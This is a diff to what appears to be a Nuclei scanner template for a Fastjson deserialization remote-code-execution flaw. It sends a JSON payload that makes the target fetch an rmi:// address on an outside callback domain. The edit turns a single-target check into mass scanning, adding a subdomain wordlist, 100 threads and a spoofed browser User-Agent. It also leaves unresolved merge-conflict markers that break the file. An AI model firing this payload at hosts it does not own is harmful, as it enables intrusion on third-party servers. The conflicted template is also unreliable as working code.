@@ -10,14 +10,23 @@ info:
   tags: fastjson,rce,deserialization,oast
 
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         POST / HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
         Content-Type: application/json
 
         {
            "@type":"org.apache.xbean.propertyeditor.JndiConverter",
+<<<<<<< HEAD
            "AsText":"rmi://{{interactsh-url}}/exploit"
         }
 
@@ -32,3 +41,7 @@ requests:
         negative: true
         status:
           - 200
+=======
+           "AsText":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/exploit"
+        }
+>>>>>>> 5d36d276 (add new stuff)
